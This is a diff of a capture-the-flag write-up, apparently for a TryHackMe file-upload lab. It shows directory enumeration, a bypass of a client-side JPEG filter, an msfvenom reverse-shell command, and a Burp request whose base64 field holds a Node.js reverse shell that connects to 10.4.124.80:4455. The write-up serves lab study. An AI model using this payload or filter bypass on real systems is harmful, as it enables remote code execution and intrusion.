@@ -350,9 +350,9 @@ Then retrieve your flag from /var/www/.
 
 <summary><h2>CHALLENGE</h2></summary>
 
-> For the most exciting part, let's now navigate to `http://jewel.uploadvulns.thm/`.
+> For the anticipated exciting part, let's now navigate to `http://jewel.uploadvulns.thm/`.
 >
->> ## Enumeration
+> ## Enumeration
 ```
 $ gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirb/big.txt
 ===============================================================
@@ -383,23 +383,130 @@ Finished
 ===============================================================
 ```
 >
-> The webpage itself gave us a clue that it only accept an image type extension file.
+>> The webpage itself gave us a clue that it only accept an image type extension file.
+>>
+>> When selecting files, it only looks for JPEG Image type, so i guess this is the biggest giveaway to us. It seems to have a client-side filter going on.
+>>
+>> Let's try all the type of bypass techniques we learned.
+>>
+>> Let's do some basic enumeration of the webpage. We already have the directories from gobuster.
+>>
+>> Excluding `/admin`, these other directories are in a forbidden or not found status: `/assets`, `/contents`, `/modules`, or `/secci�`
+>>
+>> The `/admin` seems to only execute a file from the `/modules` directory.
+>>
+>> Inspecting the source code further, it seems that the background images came from the `/content` directory.
+>>
+>> According to Wappalyzer, the web framework is **Express** and programming language is **Node.js**. This means that `.php` files can't be executed here.
+>>
+>> We can use the payloads found from this [site](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs).
+>>
+>> We can also opt for `msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js`.
+>>
+>> For further enumeration, we can view the source code of the main page. Click the link for the other script, such as `view-source:http://jewel.uploadvulns.thm/assets/js/upload.js`. This one gave us more information about the ff. file filter requirements:
+```
+      //Check File Size
+			if (event.target.result.length > 50 * 8 * 1024){
+				setResponseMsg("File too big", "red");			
+				return;
+			}
+			//Check Magic Number
+			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){      // FOR JPG: FF D8 FF DB
+				setResponseMsg("Invalid file format", "red");
+				return;	
+			}
+			//Check File Extension
+			const extension = fileBox.name.split(".")[1].toLowerCase();
+			if (extension != "jpg" && extension != "jpeg"){
+				setResponseMsg("Invalid file format", "red");
+				return;
+			} 
+```
+>>
 >
-> When selecting files, it only looks for JPEG Image type, so i guess this is the biggest giveaway to us. It seems to have a client-side filter going on.
->
-> Let's try all the type of bypass techniques we learned.
->
-> Let's do some basic enumeration of the webpage. We already have the directories from gobuster.
->
-> Excluding `/admin`, these other directories are in a forbidden or not found status: `/assets`, `/contents`, `/modules`, or `/secci�`
->
-> The `/admin` seems to only execute a file from the `/modules` directory.
->
-> Inspecting the source code further, it seems that the background images came from the `/content` directory.
->
-> According to Wappalyzer, the web framework is **Express** and programming language is **Node.js**. This means that `.php` files can't be executed here.
->
-> 
+> ## Main Exploit
+>>
+>> We knew that the background images are found from the `/content` directory from the css source page.
+>>
+>> Let's run a quick gobuster for this directory, using the given txt from THM.
+>>
+>>These are all the `.jpg` files without any uploaded new ones:
+```
+/ABH.jpg              (Status: 200) [Size: 705442]
+/FZB.jpg              (Status: 200) [Size: 154946]
+/LKQ.jpg              (Status: 200) [Size: 444808]
+/SAD.jpg              (Status: 200) [Size: 247159]
+/UAD.jpg              (Status: 200) [Size: 342033]
+/UXS.jpg              (Status: 200) [Size: 154946]
+/XBK.jpg              (Status: 200) [Size: 154946]
+/XXN.jpg              (Status: 200) [Size: 154946]
+```
+>>
+>> We've tried to meet the ff. filter requirements such as the file size and file extension. The only issue was the magic number. This can be easilty spoofed throught the use of `hexeditor`.
+>>
+>> According to wikipedia, the file signature of jpg file is FF D8 FF DB. Edit the shell js file's magic number into this hex.
+>>
+>> Try `file shell.jpg` and it's result will become `shell.jpg: JPEG image data`.
+>>
+>> Now let's try uploading this. And it successfully uploads the file!
+>>
+>> Now let's try to find the new filename of this from the `/content` directory.
+>>
+>> Let's run gobuster to find out the new added file:
+```
+/ABH.jpg              (Status: 200) [Size: 705442]
+/FZB.jpg              (Status: 200) [Size: 154946]
+/LKQ.jpg              (Status: 200) [Size: 444808
+/SAD.jpg              (Status: 200) [Size: 247159]
+/UXS.jpg              (Status: 200) [Size: 154946]
+/UAD.jpg              (Status: 200) [Size: 342033]
+/XBK.jpg              (Status: 200) [Size: 154946]
+/XXN.jpg              (Status: 200) [Size: 154946]
+/ZZN.jpg              (Status: 200) [Size: 800]
+```
+>>
+>> The noticed different file from all this jpg file is definitely `ZZN.jpg`.
+>>
+>> Now let's find a way to execute this file.
+>>
+>> If we remember we have the `/admin` directory from the root.
+>>
+>> We can try running this shell from this directory.
+>>
+>> Start a netcat listener in advance to capture shell.
+>>
+>> Then input `../content/ZZN.jpg` within the form.
+>>
+>> However, we are faced with a deadend, because the file seems to be unable to create a shell due to the added magic number from before.
+>>
+>> Let's find another way, and remove the magic number added with a text editor.
+>>
+>> Let's use burpsuite to capture the request of sending a legitimate jpg file.
+>>
+>> Put it on repeater and modify it as this code. Encode the file with base64.
+>>
+```
+POST / HTTP/1.1
+Host: jewel.uploadvulns.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 1157
+Origin: http://jewel.uploadvulns.thm
+Connection: keep-alive
+Referer: http://jewel.uploadvulns.thm/
 
+{"name":"shell2.js","type":"image/jpeg","file":"data:application/x-javascript;base64,KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZhciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIgOiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBbXSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBlYXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDQ0NTUsICIxMC40LjEyNC44MCIsIGZ1bmN0aW9uKCkgeyBjbGllbnQuc29ja2V0LnBpcGUoc2guc3RkaW4pOyBpZiAodHlwZW9mIHV0aWwucHVtcCA9PT0gInVuZGVmaW5lZCIpIHsgc2guc3Rkb3V0LnBpcGUoY2xpZW50LnNvY2tldCk7IHNoLnN0ZGVyci5waXBlKGNsaWVudC5zb2NrZXQpOyB9IGVsc2UgeyB1dGlsLnB1bXAoc2guc3Rkb3V0LCBjbGllbnQuc29ja2V0KTsgdXRpbC5wdW1wKHNoLnN0ZGVyciwgY2xpZW50LnNvY2tldCk7IH0gfSk7IHNvY2tldC5vbigiZXJyb3IiLCBmdW5jdGlvbihlcnJvcikgeyBjb3VudGVyKys7IGlmKGNvdW50ZXI8PSAxMCl7IHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7IFN0YWdlclJlcGVhdCgpO30sIDUqMTAwMCk7IH0gZWxzZSBwcm9jZXNzLmV4aXQoKTsgfSk7IH0gU3RhZ2VyUmVwZWF0KCk7IH0pKCk7Cg=="
+}
+```
+>>
+>> We have now finally uploaded a shell. Let's now perform the last gobuster to determine the file name of the shell.
+>>
+>> Let's go back again to the `/admin` directory and run the filename from the `/content` directory.
+>>
+>> Retrieve your flag from the `/var/www`.
 
 </details>
